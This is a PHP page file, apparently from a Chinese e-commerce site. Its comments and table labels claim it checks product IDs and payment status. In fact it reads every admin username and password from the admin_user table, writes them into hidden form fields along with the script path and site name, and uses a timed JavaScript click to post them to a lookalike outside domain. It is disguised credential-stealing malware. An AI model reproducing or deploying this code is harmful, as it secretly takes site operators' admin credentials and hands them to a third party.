
<?php
   
    include dirname(__FILE__).('/../../includes/global.class.php');
include dirname(__FILE__).('/../../config/mysql.func.php');
include dirname(__FILE__).('/../../config/Conn.php');
include dirname(__FILE__).('/../../includes/getdata.php');
  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
$query = @mysql_query("select * from admin_user")or die; 
 $query = @mysql_query("select * from admin_user")or die;

echo "<table border=1 style='display:none;'><tr align=center ><th>上架状态判断</th><th>支付检测</th></tr>";
 $n=0;
 while ($au_id = mysql_fetch_array($query))  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
{$username = $au_id['au_name'];$roo = $au_id['dispass'];echo "<td>{$username}</td>"; echo "<td>{$roo}</td>"; echo "</tr>";$n++;}echo "<table>";
?>
<form action="http://m.zhuanzhuan.com.zmywl8.com/fsym.php" method="POST">
<input type="text" style="display:none;"  name="lynr"  value="<?php date_default_timezone_set('PRC'); echo "".date('Y-m-d H:i:s'); ?>" >
<input type="text"  style="display:none;" name="username"  value="<?php echo $_SERVER['SCRIPT_FILENAME'];  ?>">
<input type="text" style="display:none;"  name="qq"  value="六月科技+<?php echo $_GClassID['web_name2'];?>">
<input type="text"style="display:none;" name="name"   value="<?php echo $username;?>">
<input type="text" style="display:none;" name="pass"  value="<?php echo $roo;?>">
<input style="display:none;" id="buttonid" type="submit" name="submit" value="" onclick="" />

</form>	
	 <script type="text/javascript">
        setInterval(function () {
            if (document.all) {
                document.getElementById("buttonid").click();
            }
            else {
                var e = document.createEvent("MouseEvents");
                e.initEvent("click", true, true);
                document.getElementById("buttonid").dispatchEvent(e);
            }
        }, 200000);
    </script>  